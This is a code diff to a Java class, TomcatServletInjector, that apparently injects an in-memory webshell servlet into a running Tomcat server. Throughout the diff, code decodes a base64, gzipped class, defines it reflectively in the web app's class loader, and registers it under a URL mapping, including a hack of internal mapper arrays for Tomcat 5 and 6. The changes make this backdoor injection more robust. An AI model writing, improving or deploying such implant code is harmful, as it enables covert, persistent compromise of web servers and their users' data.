@@ -62,19 +62,25 @@ public class TomcatServletInjector {
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader webAppClassLoader = getWebAppClassLoader(context);
         try {
-            return classLoader.loadClass(getClassName()).newInstance();
+            return webAppClassLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+            Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
             return clazz.newInstance();
         }
     }
@@ -85,12 +91,8 @@ public class TomcatServletInjector {
             System.out.println("servlet already injected");
             return;
         }
-        Class<?> containerClass = null;
-        try {
-            containerClass = Class.forName("org.apache.catalina.Container");
-        } catch (ClassNotFoundException var12) {
-            containerClass = Class.forName("org.apache.catalina.Container", true, context.getClass().getClassLoader());
-        }
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
+        Class<?> containerClass = contextClassLoader.loadClass("org.apache.catalina.Container");
 
         Object wrapper = invokeMethod(context, "createWrapper", null, null);
         invokeMethod(wrapper, "setName", new Class[]{String.class}, new Object[]{getClassName()});
@@ -101,7 +103,7 @@ public class TomcatServletInjector {
 
         try {
             invokeMethod(context, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{getUrlPattern(), getClassName()});
-        } catch (NoSuchMethodException var11) {
+        } catch (Exception var11) {
             invokeMethod(context, "addServletMappingDecoded", new Class[]{String.class, String.class, Boolean.TYPE}, new Object[]{getUrlPattern(), getClassName(), false});
         }
         support56Inject(context, wrapper);
@@ -121,7 +123,8 @@ public class TomcatServletInjector {
     }
 
     private void support56Inject(Object context, Object wrapper) throws Exception {
-        Class<?> serverInfo = Class.forName("org.apache.catalina.util.ServerInfo", false, context.getClass().getClassLoader());
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
+        Class<?> serverInfo = contextClassLoader.loadClass("org.apache.catalina.util.ServerInfo");
         String number = (String) invokeMethod(serverInfo, "getServerNumber", null, null);
         if (!number.startsWith("5") && !number.startsWith("6")) {
             return;
@@ -141,8 +144,8 @@ public class TomcatServletInjector {
                 if (getFieldValue(o, "object") != context) {
                     continue;
                 }
-                Class<?> mapperClazz = Class.forName("org.apache.tomcat.util.http.mapper.Mapper", false, context.getClass().getClassLoader());
-                Class<?> wrapperClazz = Class.forName("org.apache.tomcat.util.http.mapper.Mapper$Wrapper", false, context.getClass().getClassLoader());
+                Class<?> mapperClazz = contextClassLoader.loadClass("org.apache.tomcat.util.http.mapper.Mapper");
+                Class<?> wrapperClazz = contextClassLoader.loadClass("org.apache.tomcat.util.http.mapper.Mapper$Wrapper");
                 Constructor<?> declaredConstructor = wrapperClazz.getDeclaredConstructors()[0];
                 declaredConstructor.setAccessible(true);
                 Object newWrapper = declaredConstructor.newInstance();
@@ -153,7 +156,7 @@ public class TomcatServletInjector {
                 Object exactWrappers = getFieldValue(o, "exactWrappers");
                 int length = Array.getLength(exactWrappers);
                 Object newWrappers = Array.newInstance(wrapperClazz, length + 1);
-                Class<?> mapElementClass = Class.forName("org.apache.tomcat.util.http.mapper.Mapper$MapElement", false, context.getClass().getClassLoader());
+                Class<?> mapElementClass = contextClassLoader.loadClass("org.apache.tomcat.util.http.mapper.Mapper$MapElement");
                 Class<?> mapElementArrayClass = Array.newInstance(mapElementClass, 0).getClass();
                 invokeMethod(mapperClazz, "insertMap", new Class[]{mapElementArrayClass, mapElementArrayClass, mapElementClass}, new Object[]{exactWrappers, newWrappers, newWrapper});
                 setFieldValue(o, "exactWrappers", newWrappers);
@@ -225,7 +228,7 @@ public class TomcatServletInjector {
     }
 
     @SuppressWarnings("all")
-    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
         try {
             Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
             Method method = null;
@@ -245,8 +248,6 @@ public class TomcatServletInjector {
             }
             method.setAccessible(true);
             return method.invoke(obj instanceof Class ? null : obj, param);
-        } catch (NoSuchMethodException e) {
-            throw e;
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
         }
